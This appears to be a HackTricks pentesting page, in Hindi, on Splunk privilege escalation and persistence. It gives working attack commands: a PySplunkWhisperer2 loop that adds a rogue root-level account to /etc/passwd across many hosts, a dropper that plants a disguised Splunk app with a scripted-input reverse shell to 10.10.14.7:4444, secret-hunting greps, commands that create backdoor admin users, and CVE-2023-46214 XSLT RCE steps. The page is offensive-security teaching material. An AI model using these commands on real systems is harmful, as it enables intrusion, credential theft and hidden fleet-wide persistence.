# Splunk LPE और Persistence

{{#include ../../banners/hacktricks-training.md}}

यदि किसी मशीन को **internally** या **externally** **enumerating** करते समय आपको **Splunk running** मिलता है (आमतौर पर web UI के लिए **8000** और management API के लिए **8089**), तो valid credentials को अक्सर app installation, scripted inputs या management actions के माध्यम से **code execution** में बदला जा सकता है। यदि Splunk **root** के रूप में चल रहा है, तो यह अक्सर तुरंत **privilege escalation** में बदल जाता है।

यदि आपको केवल generic remote attack surface, enumeration या app-upload RCE path की आवश्यकता है, तो देखें:

{{#ref}}
../../network-services-pentesting/8089-splunkd.md
{{#endref}}

यदि आप पहले से **root** हैं और Splunk service केवल localhost पर listen नहीं कर रही है, तो आप **Splunk password hashes** चुरा सकते हैं, **encrypted secrets** recover कर सकते हैं, या locally अथवा कई forwarders में persistence बनाए रखने के लिए एक **malicious app** push कर सकते हैं।

## उपयोगी Local Files

जब आप Splunk या Splunk Universal Forwarder चला रहे host पर पहुंचते हैं, तो आमतौर पर ये सबसे महत्वपूर्ण paths होते हैं:
```bash
export SPLUNK_HOME=/opt/splunk
[ -d /opt/splunkforwarder ] && export SPLUNK_HOME=/opt/splunkforwarder

find "$SPLUNK_HOME/etc" -maxdepth 4 \( -name passwd -o -name authentication.conf -o -name user-seed.conf -o -name inputs.conf -o -name app.conf -o -name serverclass.conf -o -name outputs.conf -o -name splunk.secret \) 2>/dev/null

grep -RniE 'pass4SymmKey|sslPassword|bindDNPassword|clear_password|token' "$SPLUNK_HOME/etc" 2>/dev/null
```
महत्वपूर्ण artifacts:

- **`$SPLUNK_HOME/etc/passwd`**: local Splunk users और password hashes।
- **`$SPLUNK_HOME/etc/auth/splunk.secret`**: कई `.conf` files में stored secrets को encrypt करने के लिए Splunk द्वारा उपयोग की जाने वाली key।
- **`$SPLUNK_HOME/etc/system/local/user-seed.conf`**: initial admin bootstrap file; gold images और provisioning mistakes में उपयोगी। यदि `etc/passwd` पहले से मौजूद है, तो इसे ignore कर दिया जाता है।
- **`$SPLUNK_HOME/etc/apps/*/{default,local}/inputs.conf`**: जहाँ scripted inputs आमतौर पर enabled होते हैं।
- **`$SPLUNK_HOME/etc/deployment-apps/`** या **`$SPLUNK_HOME/etc/apps/`**: persistent app छिपाने या पहले से distribute की जा रही चीज़ों की समीक्षा करने के लिए अच्छी locations।

## Splunk Universal Forwarder Agent Exploit का सारांश

अधिक जानकारी के लिए [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/) देखें। यह केवल एक सारांश है:<sup>[[1]](#references)</sup>

**Exploit का overview:**
Splunk Universal Forwarder (UF) को target करने वाला एक exploit उन attackers को agent चलाने वाले systems पर arbitrary code execute करने की अनुमति देता है, जिनके पास **agent password** है। इससे environment का एक बड़ा हिस्सा compromise हो सकता है।

**यह क्यों काम करता है:**

- UF management service आमतौर पर **TCP 8089** पर exposed होती है।
- Attackers API से authenticate करके forwarder को **malicious app bundle** install करने का निर्देश दे सकते हैं।
- इसी primitive का उपयोग locally **LPE** या remotely **RCE** के लिए किया जा सकता है।
- **SplunkWhisperer2** जैसे public tooling app bundle को automatically create कर सकते हैं और Linux targets के लिए payloads को adapt कर सकते हैं।

**Password recover करने के सामान्य तरीके:**

- Documentation, scripts, shares या deployment automation में cleartext credentials।
- `$SPLUNK_HOME/etc/passwd` के अंदर password hashes, जिसके बाद offline cracking की जा सकती है।
- Golden images या provisioning leftovers, जैसे `user-seed.conf`।

**Impact:**

- प्रत्येक compromised host पर SYSTEM/root-level code execution।
- Persistent apps, backdoors या ransomware की deployment।
- Data forward होने से पहले telemetry को disable या tamper करना।

**Exploitation के लिए उदाहरण command:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**उपयोगी public exploits:**

- [https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [https://www.exploit-db.com/exploits/46238](https://www.exploit-db.com/exploits/46238)
- [https://www.exploit-db.com/exploits/46487](https://www.exploit-db.com/exploits/46487)

## Scripted Inputs या Malicious Apps के माध्यम से Persistence

यदि आपके पास `root`/`splunk` के रूप में **filesystem write access** है, या apps install करने के लिए authenticated access है, तो Persistence का एक बहुत विश्वसनीय mechanism **scripted input** वाला **custom app** रखना है।<sup>[[2]](#references)</sup> Splunk के अपने documentation के अनुसार scripted inputs को app directory के अंतर्गत होना चाहिए और `inputs.conf` से enabled होना चाहिए।

Typical layout:
```bash
/opt/splunk/etc/apps/.linux_audit/
├── bin/check.sh
└── default/inputs.conf
```
न्यूनतम `inputs.conf`:
```ini
[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]
disabled = 0
interval = 60
sourcetype = auditd
```
त्वरित Linux dropper:
```bash
APP="$SPLUNK_HOME/etc/apps/.linux_audit"
mkdir -p "$APP/bin" "$APP/default"
printf '#!/bin/bash\nbash -c "bash -i >& /dev/tcp/10.10.14.7/4444 0>&1"\n' > "$APP/bin/check.sh"
printf '[script://$SPLUNK_HOME/etc/apps/.linux_audit/bin/check.sh]\ndisabled = 0\ninterval = 60\n' > "$APP/default/inputs.conf"
chmod +x "$APP/bin/check.sh"
"$SPLUNK_HOME/bin/splunk" restart
```
नोट्स:

- यही trick **Universal Forwarder** पर भी `/opt/splunkforwarder/etc/apps/` का उपयोग करके काम करती है।
- Attackers अक्सर कोई स्पष्ट रूप से malicious app बनाने के बजाय किसी legitimate add-on में बदलाव करके खुद को छिपाते हैं।
- **deployment server** पर `deployment-apps/` के अंदर malicious app रखना **fleet-wide persistence** में बदल जाता है, क्योंकि forwarders updated apps के लिए poll करते हैं, उन्हें download करते हैं और लागू करने के लिए अक्सर restart होते हैं।

## Credential Theft और Admin Takeover

यदि आप Splunk की local files पढ़ सकते हैं, तो आमतौर पर दो अच्छे लक्ष्य होते हैं: **Splunk admin access** recover करना और **encrypted service credentials** recover करना।

### Password hashes और local users

Splunk local authentication data को `etc/passwd` में store करता है। Deployment के आधार पर, उस file को crack करने से web UI और management API के लिए working credentials recover किए जा सकते हैं।

यदि आपके पास पहले से valid **admin** credentials हैं और Splunk अपने **native** authentication backend का उपयोग करता है, तो CLI का उपयोग स्वयं persistence के लिए किया जा सकता है:
```bash
"$SPLUNK_HOME/bin/splunk" edit user admin -password 'Winter2026!' -auth admin:'OldPassword!'
"$SPLUNK_HOME/bin/splunk" add user svc_backup -password 'Winter2026!' -role admin -auth admin:'OldPassword!'
```
### `splunk.secret` और encrypted values

Splunk कई configuration files में stored sensitive values को सुरक्षित रखने के लिए `etc/auth/splunk.secret` का उपयोग करता है। यदि आप **secret** और संबंधित **`.conf` files** दोनों चुरा सकते हैं, तो अक्सर ये values recover या replay की जा सकती हैं:

- forwarder/indexer shared secrets जैसे `pass4SymmKey`
- TLS private-key passwords जैसे `sslPassword`
- LDAP bind credentials जैसे `bindDNPassword`

यह **lateral movement** के लिए उपयोगी है, भले ही Splunk admin password स्वयं crack न किया जा सके।

### `user-seed.conf` का दुरुपयोग

`user-seed.conf` का उपयोग केवल first start के दौरान या तब किया जाता है जब `etc/passwd` मौजूद न हो। इसलिए live box पर यह कम उपयोगी है, लेकिन इन स्थितियों में बहुत interesting है:

- compromised installation templates
- container images
- unattended provisioning workflows
- ऐसे appliances जहाँ Splunk को automatically reinitialize किया जाता है

इन मामलों में, `splunk hash-passwd` से generated `HASHED_PASSWORD` डालने से redeployment के बाद admin access वापस पाने का एक शांत तरीका मिल जाता है।

## Splunk Queries का दुरुपयोग

अधिक details के लिए [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis) देखें।<sup>[[3]](#references)[[4]](#references)</sup>

एक उपयोगी recent technique vulnerable Splunk Enterprise versions में **user-supplied XSLT** का दुरुपयोग करके low-privileged authenticated account को `splunk` user के रूप में **OS command execution** में बदलना है।

High-level flow:

1. Splunk में authenticate करें।
2. Preview/upload functionality के माध्यम से एक malicious **XSL** file upload करें।
3. Splunk को उस uploaded stylesheet से search results render करने के लिए कहें, जो **dispatch** directory से हो।
4. XSLT payload का उपयोग करके file लिखें या Splunk's search pipeline के माध्यम से execution trigger करें (उदाहरण के लिए `runshellscript` जैसी internal functionality तक पहुँचकर)।

महत्वपूर्ण offensive takeaway यह है कि यह path **app upload** की आवश्यकता के बिना **post-auth RCE** देता है। Linux पर आमतौर पर आपको **`splunk`** account मिल जाता है, जो फिर भी valuable है क्योंकि उस user के पास अक्सर application tree का ownership होता है, वह secrets पढ़ सकता है और ऐसे persistent apps डाल सकता है जो shell loss के बाद भी survive करते हैं।

Exploitation के दौरान उपयोग किया जाने वाला एक representative path है:
```text
/opt/splunk/var/run/splunk/dispatch/<sid>/shell.xsl
```
यदि Splunk बहुत अधिक privileges के साथ चल रहा है, या `splunk` user के पास dangerous scripts, writable service units, या गलत `sudo` rules का access है, तो यह एक साफ **LPE** chain बन जाती है।

## संदर्भ

- [1] [RCE और Persistence के लिए Splunk Forwarders का Abusing](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/)
- [2] [TraitorWare से सावधान: Persistence के लिए Splunk का उपयोग](https://www.huntress.com/blog/beware-of-traitorware-using-splunk-for-persistence)
- [3] [Splunk Security Advisory SVD-2023-1104 – XSLT Injection RCE (CVE-2023-46214)](https://advisory.splunk.com/advisories/SVD-2023-1104)
- [4] [CVE-2023-46214 Analysis: Splunk XSLT Injection RCE](https://blog.hrncirik.net/cve-2023-46214-analysis)

{{#include ../../banners/hacktricks-training.md}}
